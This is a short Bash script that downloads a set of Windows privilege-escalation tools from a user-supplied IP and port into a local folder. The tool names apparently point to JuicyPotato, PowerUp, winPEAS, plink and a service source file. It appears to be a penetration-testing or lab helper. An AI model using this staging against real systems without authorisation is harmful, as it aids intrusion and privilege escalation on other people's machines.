#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: ./winprivsetup.sh <IP> <PORT>"
    exit 1
fi

SERVER_IP=$1
SERVER_PORT=$2

TOOLS=(
    "jp32.exe"
    "jp.exe"
    "plink.exe"
    "PowerUps.ps1"
    "putty.exe"
    "windows_service.c"
    "winPEAS.bat"
    "winPEAS.ps1"
)

DOWNLOAD_DIR="win_priv_tools"
mkdir -p "$DOWNLOAD_DIR"
cd "$DOWNLOAD_DIR" || exit

for TOOL in "${TOOLS[@]}"; do
    echo "Downloading $TOOL from http://$SERVER_IP:$SERVER_PORT..."
    if command -v wget >/dev/null 2>&1; then
        wget -q "http://$SERVER_IP:$SERVER_PORT/$TOOL" -O "$TOOL"
    elif command -v curl >/dev/null 2>&1; then
        curl -sO "http://$SERVER_IP:$SERVER_PORT/$TOOL"
    else
        echo "Error: Neither wget nor curl is installed. Exiting."
        exit 1
    fi

    if [ -f "$TOOL" ]; then
        echo "$TOOL downloaded successfully."
    else
        echo "Failed to download $TOOL."
    fi
done

chmod +x *.bat *.ps1 2>/dev/null

echo "All tools downloaded to $DOWNLOAD_DIR."
